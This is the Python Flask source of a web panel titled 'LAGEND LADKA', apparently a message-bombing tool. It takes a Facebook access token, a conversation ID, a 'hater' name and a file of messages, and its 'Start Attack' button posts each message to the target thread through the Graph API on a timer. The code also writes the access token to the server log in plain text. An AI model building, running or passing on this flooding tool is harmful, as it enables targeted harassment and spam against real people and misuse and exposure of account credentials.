from flask import Flask, request, render_template_string
import requests
import time
from datetime import datetime

app = Flask(__name__)

# Global uptime
start_time = time.time()

# --------------------------------------------------------------------
# HTML PAGES
# --------------------------------------------------------------------
HOME_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LAGEND LADKA - 2026 PANEL</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      margin:0;
      background: linear-gradient(135deg,#ff0048,#7a00ff);
      background-size: 300% 300%;
      animation: movebg 10s ease infinite alternate;
      font-family: 'Segoe UI', sans-serif;
      color: white;
    }
    @keyframes movebg { 0%{background-position:0% 0%} 100%{background-position:100% 100%} }
    .glass-card {
      backdrop-filter: blur(14px);
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255,255,255,0.2);
      border-radius: 20px;
      padding: 25px;
      box-shadow: 0 8px 25px rgba(0,0,0,0.4);
    }
    h1 {
      font-weight: 700;
      text-align: center;
      text-shadow: 0 0 15px rgba(255,255,255,0.3);
    }
    .btn-main {
      width: 100%;
      background: linear-gradient(90deg,#ff0048,#7a00ff);
      border: none;
      border-radius: 14px;
      color: white;
      padding: 12px;
      font-size: 18px;
      font-weight: bold;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }
    .btn-main:hover {
      transform: scale(1.05);
      box-shadow: 0 0 15px rgba(255,255,255,0.5);
    }
    .footer {text-align:center;color:#fff;margin-top:20px;font-size:14px;}
  </style>
</head>
<body>
  <div class="container mt-5">
    <div class="glass-card mx-auto" style="max-width:400px;">
      <h1>😈 LAGEND LADKA 😈</h1>
      <form action="/" method="post" enctype="multipart/form-data" class="mt-3">
        <label>Enter Access Token:</label>
        <input type="text" name="accessToken" class="form-control mb-3" required>

        <label>Enter Convo/Inbox ID:</label>
        <input type="text" name="threadId" class="form-control mb-3" required>

        <label>Enter Hater Name:</label>
        <input type="text" name="kidx" class="form-control mb-3" required>

        <label>Select Your Message File (.txt):</label>
        <input type="file" name="txtFile" class="form-control mb-3" accept=".txt" required>

        <label>Speed (Seconds):</label>
        <input type="number" name="time" class="form-control mb-3" required>

        <button type="submit" class="btn-main">🚀 Start Attack</button>
      </form>

      <a href="/status">
        <button class="btn-main mt-3">📊 Server Status</button>
      </a>
    </div>
    <div class="footer">
      &copy; 2026 Made with ❤️ by LAGEND ISHU
    </div>
  </div>
</body>
</html>
"""

STATUS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Server Status</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin:0;
      display:flex;
      justify-content:center;
      align-items:center;
      flex-direction:column;
      height:100vh;
      background: linear-gradient(135deg,#ff0048,#7a00ff);
      background-size: 300% 300%;
      animation: movebg 10s ease infinite alternate;
      color:white;
      font-family: 'Segoe UI', sans-serif;
    }
    @keyframes movebg { 0%{background-position:0% 0%} 100%{background-position:100% 100%} }
    .card {
      backdrop-filter: blur(12px);
      background: rgba(255,255,255,0.08);
      border: 1px solid rgba(255,255,255,0.2);
      padding: 30px;
      border-radius: 18px;
      text-align:center;
      box-shadow:0 8px 20px rgba(0,0,0,0.3);
      width: 90%;
      max-width: 400px;
    }
    .btn-back {
      margin-top:20px;
      padding:10px 20px;
      border:none;
      border-radius:10px;
      background: linear-gradient(90deg,#ff0048,#7a00ff);
      color:white;
      font-size:16px;
      font-weight:bold;
      cursor:pointer;
      transition:transform 0.2s ease;
    }
    .btn-back:hover { transform: scale(1.05); }
  </style>
</head>
<body>
  <div class="card">
    <h2>🔥 Server Status 🔥</h2>
    <p><strong>Status:</strong> ✅ Running</p>
    <p><strong>Uptime:</strong> {{uptime}}</p>
    <button class="btn-back" onclick="window.location.href='/'">⬅ Back to Home</button>
  </div>
</body>
</html>
"""

# --------------------------------------------------------------------
# ROUTES
# --------------------------------------------------------------------
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        access_token = request.form.get("accessToken")
        thread_id = request.form.get("threadId")
        hater_name = request.form.get("kidx")
        time_interval = int(request.form.get("time"))
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        print(f"[LOG] Token: {access_token}, Thread: {thread_id}, Hater: {hater_name}, Interval: {time_interval}")
        print(f"[LOG] Loaded {len(messages)} messages from file.")

        # ✅ REAL API CALL SYSTEM
        for i, msg in enumerate(messages, start=1):
            payload = {"message": msg}
            url = f"https://graph.facebook.com/v15.0/{thread_id}/messages?access_token={access_token}"
            try:
                r = requests.post(url, data=payload)
                if r.status_code == 200:
                    print(f"[SUCCESS] ({i}) Message sent: {msg}")
                else:
                    print(f"[ERROR] ({i}) Failed: {r.text}")
            except Exception as e:
                print(f"[EXCEPTION] ({i}) {e}")
            time.sleep(time_interval)

    return render_template_string(HOME_PAGE)

@app.route("/status")
def status():
    uptime_seconds = int(time.time() - start_time)
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime_seconds))
    return render_template_string(STATUS_PAGE, uptime=uptime_str)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
